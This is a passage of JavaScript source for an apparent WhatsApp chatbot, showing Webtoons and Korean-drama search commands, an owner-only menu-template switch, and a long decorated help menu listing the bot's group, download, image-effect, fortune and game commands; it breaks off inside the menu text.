            hisoka.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
            let capt = `Webtoons Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Judul: ${i.judul}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Like: ${i.like}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Creator: ${i.creator}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Genre: ${i.genre}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url: ${i.url}\n\n──────────────────────\n`
            }
            m.reply(capt)
            }
            break
            case 'drakor': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Judul: ${i.judul}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Years: ${i.years}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Genre: ${i.genre}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url: ${i.url}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) return
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                hisoka.sendListMsg(m.chat, `Please select the menu you want to change!`, hisoka.user.name, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break
            case 'list': case 'menu': case 'help': case '?': {
            if (!isCreator) return
                anu = `
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
          ╔╗    ╔╗    ╔╗    
          ╚╗    ║║    ╚╗    
          ╚╝    ╚╝    ╚╝   
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│  〘 GROUP MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}linkgroup
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ephemeral [option]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}setppgc [image]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}setname [text]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}setdesc [text]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}group [option]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}editinfo [option]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}add @user
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}kick @user
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}hidetag [text]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tagall [text]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}antilink [on/off]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}mute [on/off]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}promote @user
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}demote @user
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}vote [text]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}devote
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}upvote
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}cekvote
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}hapusvote
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│ 〘WEBZONE MENU〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}playstore
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gsmarena
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}jadwalbioskop
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}nowplayingbioskop
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}aminio
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}wattpad
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}webtoons
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}drakor
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│〘 DOWNLOAD MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tiktoknowm [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tiktokwm [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tiktokmp3 [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}instagram [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}twitter [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}twittermp3 [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}facebook [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}pinterestdl [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ytmp3 [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ytmp4 [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}getmusic [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}getvideo [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}umma [url]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}joox [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}soundcloud [url]
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│ 〘 SEARCH MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}play [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}yts [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}google [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gimage [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}pinterest [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}wallpaper [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}wikimedia [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ytsearch [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ringtone [query]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}stalk [option] [query]
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│ 〘 RANDOM MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}coffe
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}quotesanime
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}motivasi
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}dilanquote
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bucinquote
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}katasenja
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}puisi
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}couple
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}anime
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}waifu
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}husbu
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}neko
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}shinobu
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}waifus (nsfw)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}nekos (nsfw)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}trap (nsfw)
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}blowjob (nsfw)
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│  〘TEKS PRO MENU〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}3dchristmas
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}3ddeepsea
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}americanflag
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}3dscifi
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}3drainbow
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}3dwaterpipe
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}halloweenskeleton
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}sketch
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}bluecircuit
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}space
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}metallic
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}fiction
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}greenhorror
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}transformer
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}berry
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}thunder
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}magma
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}3dcrackedstone
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}3dneonlight
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}impressiveglitch
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}naturalleaves
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}fireworksparkle
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}matrix
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}dropwater
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}harrypotter
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}foggywindow
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}neondevils
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}christmasholiday
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}3dgradient
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}blackpink
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}gluetext
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│〘PHOTO OXY MENU〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}shadow
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}romantic
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}smoke
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}burnpapper
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}naruto
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}lovemsg
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}grassmsg
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}lovetext
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}coffecup
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}butterfly
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}harrypotter
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}retrolol
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│ 〘 EPHOTO MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ffcover
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}crossfire
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}galaxy
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}glass
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}neon
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}beach
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}blackpink
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}igcertificate
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ytcertificate
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│    〘 FUN MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}simih
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}halah
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}hilih
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}huluh
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}heleh
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}holoh
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}jadian
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}jodohku
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}delttt
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tictactoe
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}family100
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tebak [option]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}math [mode]
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}suitpvp [@tag]
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│ 〘 PRIMBON MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}nomorhoki
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}artimimpi
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}artinama
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ramaljodoh
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ramaljodohbali
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}suamiistri
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ramalcinta
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}cocoknama
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}pasangan
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}jadiannikah
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}sifatusaha
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}rezeki
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}pekerjaan
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}nasib
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}penyakit
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tarot
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}fengshui
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}haribaik
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}harisangar
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}harisial
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}nagahari
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}arahrezeki
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}peruntungan
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}weton
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}karakter
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}keberuntungan
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}memancing
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}masasubur
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}zodiak
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}shio
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│ 〘 CONVERT MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}attp
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ttp
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}toimage
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}removebg
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}sticker
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}emojimix
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}emojimix2
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tovideo
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}togif
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tourl
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tovn
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}tomp3
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}toaudio
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ebinary
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}dbinary
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}styletext
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}smeme
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│   〘 MAIN MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}ping
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}owner
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}menu / ${prefix}help / ${prefix}?
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}delete
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}infochat
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}quoted
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}listpc
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}listgc
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}listonline
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}speedtest
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│〘 DATABASE MENU 〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}setcmd
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}listcmd
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}delcmd
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}lockcmd
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}addmsg
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}listmsg
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}getmsg
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}delmsg
╰━═════════════━•
 •━════〘𝟱𝟬𝟱〙════━• 
╭━═════════════━• 
│〘ANONYMOUS MENU〙
╰━═════════════━• 
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}anonymous
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}start
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ${prefix}next
